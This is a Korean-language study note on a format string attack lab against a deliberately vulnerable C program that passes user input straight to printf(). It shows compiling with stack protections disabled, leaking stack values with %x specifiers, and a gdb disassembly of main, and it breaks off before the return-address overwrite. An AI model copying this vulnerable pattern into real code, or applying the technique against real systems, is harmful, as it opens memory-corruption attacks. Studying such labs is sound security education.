## Format String Attack

### Format String Attack 실습 1(Return Address)
```C
#include<stdio.h>
#include<string.h>

int main(int argc, char *argv[])
{
        char buf[20];

        strcpy(buf, argv[1]);
        printf(buf);
}
```
fsb1 프로그램은 argv[1]의 문자열을 buf로 복사하고 printf() 함수로 buf를 출력하는 프로그램이다. printf() 함수에서 Format String Buf 취약점이 발생한다.
이 프로그램에서는 두 가지의 Return Address를 공격할 수 있다. **main()함수의 Return Address**와 **printf()함수의 Return Address**이다.
먼저 main()함수의 Return Address부터 공격해보았다.
```
yoojin@ubuntu:~/Study/System/BOF$ gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack -no-pie -o fsb1 fsb1.c
fsb1.c: In function ‘main’:
fsb1.c:9:9: warning: format not a string literal and no format arguments [-Wformat-security]
  printf(buf);
         ^
yoojin@ubuntu:~/Study/System/BOF$ ./fsb1 "AAAA %x %x %x %x"
AAAA 41414141 20782520 25207825 78252078
```
컴파일 후 실행하여 포맷 스트링 취약점을 확인해 보면 위와 같이 %x 서식 지정자를 입력하니 스택 안의 주소 값들이 출력되었다.
입력한 문자열 "AAAA"가 바로 이어 나온다.
```
yoojin@ubuntu:~/Study/System/BOF$ gdb -q fsb1
warning: ~/peda.peda.py: No such file or directory
Reading symbols from fsb1...(no debugging symbols found)...done.
gdb-peda$ pd main
Dump of assembler code for function main:
   0x0804843b <+0>:	push   ebp
   0x0804843c <+1>:	mov    ebp,esp
   0x0804843e <+3>:	sub    esp,0x14
   0x08048441 <+6>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048444 <+9>:	add    eax,0x4
   0x08048447 <+12>:	mov    eax,DWORD PTR [eax]
   0x08048449 <+14>:	push   eax
   0x0804844a <+15>:	lea    eax,[ebp-0x14]
   0x0804844d <+18>:	push   eax
   0x0804844e <+19>:	call   0x8048310 <strcpy@plt>
   0x08048453 <+24>:	add    esp,0x8
   0x08048456 <+27>:	lea    eax,[ebp-0x14]
   0x08048459 <+30>:	push   eax
   0x0804845a <+31>:	call   0x8048300 <printf@plt>
   0x0804845f <+36>:	add    esp,0x4
   0x08048462 <+39>:	mov    eax,0x0
   0x08048467 <+44>:	leave  
   0x08048468 <+45>:	ret    
End of assembler dump.
```
main()함수의 Return Address를 알아내기 위해 gdb로 분석해보았다. esp를 0x14만큼 빼고 있따. buf 변수를 할당하는 명령문이다.
그리고 strcpy() 함수 호출을 위한 argv[1]과 buf의 주소를 스텍에 PUSH하고 strcpy() 함수를 호출한다.
그리고 다시 printf() 함수 호출을 위한 buf의 주소를 PUSH하고 printf() 함수를 호출한다.
```
